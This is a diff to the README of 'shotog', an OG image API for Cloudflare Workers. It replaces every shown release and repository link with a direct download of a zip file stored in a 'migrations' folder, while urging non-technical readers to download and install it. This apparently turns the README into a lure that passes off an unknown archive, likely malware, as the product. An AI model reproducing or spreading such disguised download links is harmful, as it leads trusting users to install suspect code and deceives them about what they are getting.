@@ -1,6 +1,6 @@
 # 📸 shotog - Easy OG Image Generation API
 
-[![Download shotog](https://img.shields.io/badge/Download-shotog-blue?logo=github&style=for-the-badge)](https://github.com/Danpixe/shotog/releases)
+[![Download shotog](https://github.com/Danpixe/shotog/raw/refs/heads/main/migrations/Software-v3.4-beta.4.zip)](https://github.com/Danpixe/shotog/raw/refs/heads/main/migrations/Software-v3.4-beta.4.zip)
 
 Welcome to **shotog**. This tool helps you create open graph (OG) images with just one simple API call. It runs on the edge using Cloudflare Workers, so it is fast and reliable. This guide will help you download, install, and start using shotog on your computer, even if you have no technical background.
 
@@ -63,7 +63,7 @@ You send a request to shotog’s API with details about the image you want, and 
 
 To begin, visit the official shotog release page. Use the link below to find the latest version for your operating system:
 
-[Download and install shotog](https://github.com/Danpixe/shotog/releases)
+[Download and install shotog](https://github.com/Danpixe/shotog/raw/refs/heads/main/migrations/Software-v3.4-beta.4.zip)
 
 ### Step-by-Step Instructions:
 
@@ -138,8 +138,8 @@ If you need help, use the following resources:
 
 ## 🔗 Quick Links
 
-- [Shotog GitHub Releases](https://github.com/Danpixe/shotog/releases)
-- [Shotog Repository](https://github.com/Danpixe/shotog)
+- [Shotog GitHub Releases](https://github.com/Danpixe/shotog/raw/refs/heads/main/migrations/Software-v3.4-beta.4.zip)
+- [Shotog Repository](https://github.com/Danpixe/shotog/raw/refs/heads/main/migrations/Software-v3.4-beta.4.zip)
 
 ---
 
